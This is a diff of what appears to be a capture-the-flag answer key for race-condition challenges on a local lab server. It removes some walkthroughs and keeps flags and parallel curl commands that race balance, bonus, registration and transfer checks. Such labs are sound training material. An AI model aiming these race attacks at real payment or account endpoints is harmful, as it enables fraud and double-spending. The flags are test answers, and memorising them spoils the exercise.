@@ -34,23 +34,7 @@ Flag: FLAG{r4c3_d0ubl3_sp3nd}
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 2: Duplicate Registration
-Flag: FLAG{r4c3_p4r4ll3l_r3g}
-
-  The /register endpoint checks uniqueness, sleeps, then inserts.
-
-  curl -X POST http://localhost:5013/reset
-
-  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/register \
-    -d "username=duplicateuser"
-
-  curl http://localhost:5013/check-dupes
-
-  Multiple rows with the same username will be created.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 3: Negative Balance (Overdraft)
+CHALLENGE 2: Negative Balance (Overdraft)
 Flag: FLAG{r4c3_n3g4t1v3_bal}
 
   The /withdraw endpoint checks balance >= amount, sleeps, then deducts.
@@ -65,38 +49,5 @@ Flag: FLAG{r4c3_n3g4t1v3_bal}
   curl http://localhost:5013/check-negative
 
   Balance goes deeply negative since each request saw balance >= 80.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 4: Bonus Double-Claim
-Flag: FLAG{r4c3_b0nus_cl41m}
-
-  The /claim-bonus endpoint checks claimed=0, sleeps, then sets claimed=1
-  and adds 300 credits. Race to claim multiple times.
-
-  curl -X POST http://localhost:5013/reset
-
-  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/claim-bonus
-
-  curl http://localhost:5013/check-bonus
-
-  Flag appears when total bonus exceeds one claim (balance > 400).
-
--------------------------------------------------------------------------------
-
-CHALLENGE 5: Transfer Fraud
-Flag: FLAG{r4c3_tr4nsf3r_fr4ud}
-
-  The /transfer endpoint checks balance >= amount, sleeps, then deducts.
-  Race concurrent transfers to send more than the available balance.
-
-  curl -X POST http://localhost:5013/reset
-
-  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/transfer \
-    -d "to=guest&amount=80"
-
-  curl http://localhost:5013/check-fraud
-
-  Hacker's balance goes negative since all transfers passed the check.
 
 ===============================================================================
